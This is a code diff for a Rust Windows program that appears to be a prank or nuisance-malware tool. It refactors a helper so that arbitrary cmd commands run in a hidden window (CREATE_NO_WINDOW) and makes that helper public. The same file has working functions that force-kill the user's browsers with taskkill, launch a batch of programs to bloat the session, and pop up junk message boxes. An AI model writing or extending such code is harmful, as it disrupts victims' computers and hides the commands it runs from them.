@@ -2,26 +2,21 @@ use winapi::um::winuser::*;
 use winapi::shared::windef::POINT;
 use std::process::Command;
 use alloc::ffi::CString;
+use std::os::windows::process::CommandExt;
 use rand::Rng;
-use rand::prelude::SliceRandom;
+use rand::prelude::{SliceRandom};
 use winapi::shared::minwindef::UINT;
 
 
-// used to make new ones, those are not public
-fn execute_command(command: &str, output: bool) -> String {
-    if output {
-        let output = Command::new("cmd")
-            .args(["/C", command])
-            .output()
-            .expect("failed to execute command");
-        String::from_utf8_lossy(&output.stdout).to_string()
-    } else {
-        let _child = Command::new("cmd")
-            .args(["/C", command])
-            .spawn()
-            .expect("failed to execute command");
-        return String::from("0")
-    }
+// used to make new ones
+pub fn execute_command(command: &str) -> String {
+    let mut output = Command::new("cmd");
+    output.creation_flags(0x8000000);
+    let output = output
+        .args(["/C", command])
+        .output()
+        .unwrap();
+    String::from_utf8_lossy(&output.stdout).to_string()
 }
 
 fn msgbox(desc: &str, caption: &str, structure: UINT) {
@@ -39,7 +34,7 @@ fn msgbox(desc: &str, caption: &str, structure: UINT) {
 
 fn site(url: &str) {
     let site = format!("start {}", url);
-    let _ = execute_command(&site, false);
+    let _ = execute_command(&site);
 }
 
 fn lmgtfy(keywords: &str) {
@@ -54,7 +49,7 @@ fn speak(phrase: &str) {
         .output()
         .unwrap();
 }
-// used to make new ones, those are not public
+// used to make new ones
 
 pub fn weird_msgbox() {
     let message = String::from("👨‍⚕️👩‍⚕️👨‍🚀👩‍🚀👨‍🚒👩‍🚒👨‍🎨👩‍🎨👨‍🔬👩‍🔬👨‍🔧👩‍🔧👨‍💼👩‍💼👨‍💻👩‍💻👨‍🏭👩‍🏭👨‍🏫👩‍🏫👨‍🎤👩‍🎤👨‍🎓👩‍🎓👨‍🍳👩‍🍳👨‍🌾👩‍🌾💂‍♂️💂‍♀️🕵️‍♂️🕵️‍♀️👮‍♂️👮‍♀️👷‍♂️👷‍♀️🤴👸🤵👰👳‍♂️👳‍♀️👲👵👴🧑👩👦👶👅👃👂👀🦴🦺🦹🦸🧕👳‍♂️👳‍♀️👲💪🤙👋🖐️🖕🦾✍️🦷💅🦵🦶👄👩‍🦱👨‍🦱👨‍🦰👩‍🦰👨‍🦳👩‍🦳👩‍🦲👨‍🦲🦸🦹🦺👨‍🦯👩‍🦯👨‍🦼👩‍🦼👨‍🦽👩‍🦽👨‍🦱👩‍🦱👨‍🦰👩‍🦰👨‍🦳👩‍🦳👨‍🦲👩‍🦲👨‍🦯👩‍🦯👨‍🦼👩‍🦼👨‍🦽👩‍🦽👨‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👩👩‍❤️‍👨💏👩‍❤️‍💋‍👨💋👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨❤");
@@ -119,7 +114,7 @@ pub fn kill_browser() {
         "avastsecurebrowser.exe",
         "avastbrowser.exe"
     ];
-    for line in execute_command("tasklist", true).lines().skip(2) {
+    for line in execute_command("tasklist").lines().skip(2) {
         let columns: Vec<&str> = line.split_whitespace().collect();
         if columns.len() >= 2 {
             let name = columns[0];
@@ -128,7 +123,7 @@ pub fn kill_browser() {
             if let Some(i) = target_names.iter().position(|&x| x == &name.to_lowercase()) {
                 target_names.remove(i);
                 let taskkill_command = String::from("taskkill -f -im ")+name;
-                execute_command(&taskkill_command, false);
+                execute_command(&taskkill_command);
             }
 
         }
@@ -194,7 +189,7 @@ pub fn bloat_start() {
         String::from("mstsc")
     ];
     for program in programs {
-        execute_command(&program, false);
+        execute_command(&program);
     }
 }
 
